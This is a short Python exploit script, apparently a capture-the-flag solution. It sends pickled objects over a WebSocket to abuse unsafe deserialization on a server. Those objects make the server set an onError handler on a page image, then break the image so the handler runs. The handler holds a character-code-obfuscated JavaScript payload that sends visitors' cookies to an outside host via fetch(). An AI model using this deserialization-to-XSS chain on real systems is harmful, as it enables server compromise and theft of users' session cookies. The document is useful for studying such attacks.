#!/usr/bin/env python3

import browserhelpers
import pickle
import base64
import asyncio
import websockets
import time

payload = "eval(String.fromCharCode(102,101,116,99,104,40,34,104,116,116,112,58,47,47,91,57,48,48,48,58,52,55,48,58,98,50,98,53,58,99,97,102,101,58,50,49,54,58,51,101,102,102,58,102,101,48,51,58,50,100,93,63,97,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,10))"

class EvilMessage1(object):
    def __reduce__(self):
        return (browserhelpers.set_attr, ("#logo", "onError", payload))

class EvilMessage2(object):
    def __reduce__(self):
        return (browserhelpers.set_attr, ("#logo", "src", "b"))

async def attack():
    url = "ws://[9000:470:b2b5:cafe:216:3eff:fe01:2525]/ws"
    async with websockets.connect(url) as ws:
        data = EvilMessage1()
        data = pickle.dumps(data)
        data = base64.b64encode(data).decode()

        print(await ws.recv())
        await ws.send(data)
        print("Sent!")

        data = EvilMessage2()
        data = pickle.dumps(data)
        data = base64.b64encode(data).decode()

        await ws.send(data)
        print("Sent!")

asyncio.get_event_loop().run_until_complete(attack())

#import browser

#a = browser.document.query("#test")
#a.set_attr("onError", "alert(1)")
#a.set_attr("src", "b")
